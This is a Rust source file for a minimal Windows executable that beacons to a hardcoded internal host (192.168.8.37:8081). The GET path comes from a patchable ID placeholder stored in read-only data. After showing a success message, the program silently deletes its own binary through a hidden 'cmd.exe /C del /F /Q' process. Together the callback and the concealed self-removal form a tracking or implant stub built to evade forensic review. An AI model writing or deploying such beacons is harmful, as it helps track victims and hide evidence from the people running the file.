#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![no_std]
#![no_main]
#![feature(abi_thiscall)]
#![allow(named_asm_labels)]

#[unsafe(no_mangle)]
pub unsafe extern "C" fn memcpy(dest: *mut u8, src: *const u8, n: usize) -> *mut u8 {
    let mut i = 0;
    while i < n {
        *dest.add(i) = *src.add(i);
        i += 1;
    }
    dest
}

#[unsafe(no_mangle)]
pub unsafe extern "C" fn memset(s: *mut u8, c: i32, n: usize) -> *mut u8 {
    let byte = c as u8;
    let mut i = 0;
    while i < n {
        *s.add(i) = byte;
        i += 1;
    }
    s
}

#[unsafe(no_mangle)]
pub unsafe extern "C" fn memcmp(s1: *const u8, s2: *const u8, n: usize) -> i32 {
    let mut i = 0;
    while i < n {
        let a = *s1.add(i);
        let b = *s2.add(i);
        if a != b {
            return (a as i32) - (b as i32);
        }
        i += 1;
    }
    0
}

#[unsafe(no_mangle)]
pub extern "C" fn __CxxFrameHandler3() -> u32 {
    0
}

#[unsafe(no_mangle)]
pub extern "C" fn fma(x: f64, y: f64, z: f64) -> f64 {
    (x * y) + z
}

#[unsafe(no_mangle)]
pub extern "C" fn fmaf(x: f32, y: f32, z: f32) -> f32 {
    (x * y) + z
}

use core::panic::PanicInfo;
use windows_sys::Win32::{
    System::SystemServices::{DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH},
    System::Memory::{VirtualAlloc, VirtualFree, MEM_COMMIT, PAGE_READWRITE, MEM_RELEASE, VirtualProtect, PAGE_READONLY},
    Networking::WinHttp::{WinHttpOpen, WinHttpConnect, WinHttpOpenRequest, WinHttpSendRequest, WinHttpCloseHandle, INTERNET_DEFAULT_HTTP_PORT, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_FLAG_BYPASS_PROXY_CACHE},
    System::Threading::{CreateProcessW, STARTUPINFOW, PROCESS_INFORMATION, INFINITE, STARTF_USESHOWWINDOW, CREATE_NO_WINDOW},
    System::LibraryLoader::GetModuleFileNameW,
    Foundation::CloseHandle,
    UI::WindowsAndMessaging::SW_HIDE,
};
extern crate alloc;
use alloc::vec::Vec;
use alloc::alloc::{alloc, dealloc};
use alloc::alloc::Layout;
use core::ffi::c_void;
use core::cell::UnsafeCell;
use core::ptr::{null, null_mut, copy_nonoverlapping};
use windows_sys::Win32::Networking::WinHttp::*;
use windows_sys::Win32::UI::WindowsAndMessaging::{MessageBoxW, MB_OK};

// 定义对齐的结构体
#[repr(C, align(4))]  // 4字节对齐
struct AlignedPayload([u16; 16]);


#[unsafe(link_section = ".rdata")]
static PAYLOAD: AlignedPayload = AlignedPayload([0x0058; 16]); // UTF-16编码的初始填充

#[global_allocator]
static ALLOCATOR: Win32HeapAllocator = Win32HeapAllocator;

// Windows堆内存分配器实现
struct Win32HeapAllocator;

unsafe impl core::alloc::GlobalAlloc for Win32HeapAllocator {
    unsafe fn alloc(&self, layout: core::alloc::Layout) -> *mut u8 {
        VirtualAlloc(
            core::ptr::null_mut(),
            layout.size(),
            MEM_COMMIT,
            PAGE_READWRITE,
        ) as _
    }
    
    unsafe fn dealloc(&self, ptr: *mut u8, _layout: core::alloc::Layout) {
        // Windows通常不单独释放已提交的页面
        VirtualFree(ptr as *mut _, 0, MEM_RELEASE);
    }
}


type HINTERNET = *mut u8;
type DWORD = u32;
type LPCWSTR = *const u16;
type LPVOID = *mut u8;

// 安全封装UTF-16字符串转换（栈分配）
fn encode_utf16_stack<const N: usize>(s: &str) -> [u16; N] {
    let mut buffer = [0u16; N];
    let mut iter = s.encode_utf16();
    for i in 0..N-1 { // 保留最后一位给null终止符
        if let Some(c) = iter.next() {
            buffer[i] = c;
        } else {
            break;
        }
    }
    buffer
}

// RAII
/// Heap-allocated UTF-16 string with automatic deallocation
struct Utf16String {
    ptr: *mut u16,
    len: usize,
}
impl Utf16String {
    pub fn new(s: &str) -> Self {
        let len = s.encode_utf16().count() + 1;
        let layout = Layout::array::<u16>(len).unwrap();
        let ptr = unsafe { alloc(layout) as *mut u16 };

        let mut i = 0;
        for c in s.encode_utf16() {
            unsafe { *ptr.add(i) = c };
            i += 1;
        }
        unsafe { *ptr.add(i) = 0 }; // null终止

        Self { ptr, len }
    }

    pub fn as_ptr(&self) -> *const u16 {
        self.ptr
    }

    pub fn len(&self) -> usize {
        self.len
    }
}

impl Drop for Utf16String {
    fn drop(&mut self) {
        let layout = Layout::array::<u16>(self.len).unwrap();
        unsafe { dealloc(self.ptr as *mut u8, layout) };
    }
}

/// 最多支持的路径长度（含null终止）
const MAX_PATH_LEN: usize = 260;

unsafe fn get_current_exe_path(buf: &mut [u16; MAX_PATH_LEN]) -> usize {
    let len = GetModuleFileNameW(0 as *mut c_void, buf.as_mut_ptr(), MAX_PATH_LEN as u32);
    len as usize
}

/// `cmd.exe /C del /F /Q "C:\path\to\self.exe" >nul 2>&1`
unsafe fn build_cmdline(exe_path: &[u16]) -> Utf16String {
    let prefix = Utf16String::new(r#"cmd.exe /C del /F /Q ""#);
    let suffix = Utf16String::new(r#"" >nul 2>&1"#);

    // exe_path 是 null 终止的，所以我们要去除尾部 null 以拼接
    let path_len = exe_path.iter().position(|&c| c == 0).unwrap_or(exe_path.len());
    let total_len = prefix.len() + path_len + suffix.len(); // 包含 prefix/suffix 的 null

    let layout = Layout::array::<u16>(total_len).unwrap();
    let cmd_ptr = unsafe { alloc(layout) as *mut u16 };

    unsafe {
        let mut offset = 0;

        copy_nonoverlapping(prefix.as_ptr(), cmd_ptr.add(offset), prefix.len() - 1);
        offset += prefix.len() - 1;

        copy_nonoverlapping(exe_path.as_ptr(), cmd_ptr.add(offset), path_len);
        offset += path_len;

        copy_nonoverlapping(suffix.as_ptr(), cmd_ptr.add(offset), suffix.len());
    }

    Utf16String { ptr: cmd_ptr, len: total_len }
}

#[unsafe(no_mangle)]
pub extern "system" fn mainCRTStartup() -> i32 {
    unsafe {
        let ptr = &PAYLOAD as *const _ as *mut core::ffi::c_void;
        let mut old = 0;
        VirtualProtect(ptr, core::mem::size_of_val(&PAYLOAD), PAGE_READONLY, &mut old);
    };

    let method = Utf16String::new("GET");
    let ip_or_domain = Utf16String::new("192.168.8.37");
    let entry_id = core::ptr::addr_of!(PAYLOAD.0) as *const u16;
    unsafe{


        let h_session = WinHttpOpen(
            null(), 
            WINHTTP_ACCESS_TYPE_NO_PROXY, 
            null(), 
            null(), 
            0
        );
        if h_session.is_null() {
            return 0;
        }
        
        let h_connect = WinHttpConnect(
            h_session,
            ip_or_domain.as_ptr(), //ip or domain
            8081 as u16, // port
            0
        );
        
        let h_request = WinHttpOpenRequest(
            h_connect,
            method.as_ptr(), //get or post
            entry_id,  // 路径
            null(),  
            null(),  
            null(),
            WINHTTP_FLAG_BYPASS_PROXY_CACHE
        );
        
        let result = WinHttpSendRequest(
            h_request,
            core::ptr::null(),
            0,
            core::ptr::null(),
            0,
            0,
            0
        );
        
        let text = Utf16String::new("运行成功");
        let caption = Utf16String::new("已完成");
        MessageBoxW(
            core::ptr::null_mut(),
            text.as_ptr(),
            caption.as_ptr(),
            MB_OK,
        );

        WinHttpCloseHandle(h_request);
        WinHttpCloseHandle(h_connect);
        WinHttpCloseHandle(h_session);


        //self kill
        //隐藏窗口：需要设置 dwCreationFlags 参数为 CREATE_NO_WINDOW，并确保 STARTUPINFOW 结构体的 dwFlags 含有 STARTF_USESHOWWINDOW，且 wShowWindow 被设置为 SW_HIDE。
        let mut exe_buf = [0u16; MAX_PATH_LEN];
        let len = get_current_exe_path(&mut exe_buf);

        let cmdline = build_cmdline(&exe_buf[..len]);

        let mut si: STARTUPINFOW = core::mem::zeroed();
        si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
        si.dwFlags = windows_sys::Win32::System::Threading::STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE as u16;

        let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

        let success = CreateProcessW(
            null_mut(),                         // lpApplicationName
            cmdline.as_ptr() as *mut u16,       // lpCommandLine
            null_mut(),                         // lpProcessAttributes
            null_mut(),                         // lpThreadAttributes
            0,                                   // bInheritHandles
            CREATE_NO_WINDOW,                                   // dwCreationFlags
            null_mut(),                         // lpEnvironment
            null_mut(),                         // lpCurrentDirectory
            &si as *const _ as *mut _,          // lpStartupInfo
            &mut pi as *mut _                   // lpProcessInformation
        );

        if success != 0 {
            // 等待子进程启动（可选）
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        };

        0

    }
}


#[cfg(not(test))]
#[panic_handler]
fn panic(info: &PanicInfo) -> ! {
    // 实现结构化panic处理（可记录到共享内存）
    unsafe { windows_sys::Win32::System::Threading::ExitProcess(0xDEAD) };
}